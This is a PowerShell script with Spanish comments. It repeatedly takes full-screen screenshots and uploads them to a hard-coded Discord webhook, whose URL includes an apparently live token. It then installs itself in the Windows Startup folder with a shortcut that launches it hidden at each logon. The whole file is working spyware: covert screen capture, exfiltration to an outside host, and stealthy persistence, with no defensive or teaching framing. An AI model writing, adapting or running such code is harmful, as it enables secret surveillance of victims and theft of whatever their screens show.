# Función para capturar y enviar la captura de pantalla al webhook
function CaptureAndSendScreenshot {
    # Definir la ruta del archivo temporal de la captura de pantalla
    $screenshotFile = "$env:TEMP\SC.png"

    # Capturar la pantalla y guardarla en el archivo temporal
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envío de la captura de pantalla al webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
}

# Definir la URL del webhook
$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

# Definir la cantidad de capturas de pantalla a enviar
$numberOfScreenshots = 2

# Definir el intervalo de tiempo entre capturas (en segundos)
$intervalSeconds = 30

# Realizar capturas de pantalla y enviarlas al webhook
for ($i = 1; $i -le $numberOfScreenshots; $i++) {
    CaptureAndSendScreenshot
    Start-Sleep -Seconds $intervalSeconds
}

# Copiar el script a la carpeta de inicio de Windows
$scriptPath = $MyInvocation.MyCommand.Path
$startupFolder = [Environment]::GetFolderPath("Startup")
$scriptDestination = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.ps1"
Copy-Item -Path $scriptPath -Destination $scriptDestination -Force

# Crear un acceso directo en la carpeta de inicio de Windows para ejecutar el script
$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.lnk"
$wScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $wScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File `"$scriptDestination`""
$shortcut.Save()
